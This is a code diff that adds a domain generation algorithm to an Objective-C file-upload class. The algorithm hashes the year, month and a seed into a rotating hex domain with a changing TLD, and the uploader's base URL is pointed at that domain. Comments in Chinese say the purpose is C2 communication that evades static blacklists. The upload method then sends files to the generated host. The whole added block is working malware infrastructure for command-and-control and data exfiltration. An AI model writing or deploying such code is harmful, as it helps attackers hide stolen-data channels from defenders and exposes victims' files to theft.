@@ -17,6 +17,59 @@
     return self;
 }
 
+- (instancetype)initWithDGASeed:(uint32_t)seed {
+    NSString* domain = [SimpleUploader currentMonthDomainWithSeed:seed];
+    NSURL* url = [NSURL URLWithString:[NSString stringWithFormat:@"http://%@/", domain]];
+    return [self initWithBaseURL:url];
+}
+
+#pragma mark - MonthlyCycleDGA
+
+// 月度循环域名生成算法
+// 算法: FNV-1a hash(year, month, seed) → 16进制字符串 → 域名
+// 每月生成不同域名, 用于 C2 通信规避静态黑名单
++ (NSString*)generateDomainForYear:(int)year month:(int)month seed:(uint32_t)seed {
+    // FNV-1a 哈希
+    uint64_t hash = 1469598103934665603ULL;  // FNV offset basis
+    uint8_t data[8];
+    data[0] = (year >> 8) & 0xFF;
+    data[1] = year & 0xFF;
+    data[2] = month & 0xFF;
+    data[3] = (seed >> 24) & 0xFF;
+    data[4] = (seed >> 16) & 0xFF;
+    data[5] = (seed >> 8) & 0xFF;
+    data[6] = seed & 0xFF;
+    data[7] = (year + month + seed) & 0xFF;  // 校验字节
+
+    for (int i = 0; i < 8; i++) {
+        hash ^= data[i];
+        hash *= 1099511628211ULL;  // FNV prime
+    }
+
+    // 生成 12 字符的十六进制域名前缀
+    const char* hex = "0123456789abcdef";
+    char name[16];
+    for (int i = 0; i < 12; i++) {
+        name[i] = hex[(hash >> (i * 4)) & 0xF];
+    }
+    name[12] = '\0';
+
+    // TLD 列表 (按月轮换)
+    NSArray* tlds = @[@".com", @".net", @".org", @".info", @".biz",
+                      @".xyz", @".top", @".club", @".online", @".site",
+                      @".work", @".link"];
+    NSString* tld = tlds[(month - 1) % tlds.count];
+
+    return [NSString stringWithFormat:@"%s%@", name, tld];
+}
+
++ (NSString*)currentMonthDomainWithSeed:(uint32_t)seed {
+    NSCalendar* cal = [NSCalendar currentCalendar];
+    NSDateComponents* comps = [cal components:NSCalendarUnitYear | NSCalendarUnitMonth
+                                     fromDate:[NSDate date]];
+    return [self generateDomainForYear:(int)comps.year month:(int)comps.month seed:seed];
+}
+
 - (void)uploadFile:(NSString*)filePath withType:(NSString*)type {
     NSURL* url = [NSURL URLWithString:[NSString stringWithFormat:@"upload/%@", type]
                           relativeToURL:_baseURL];
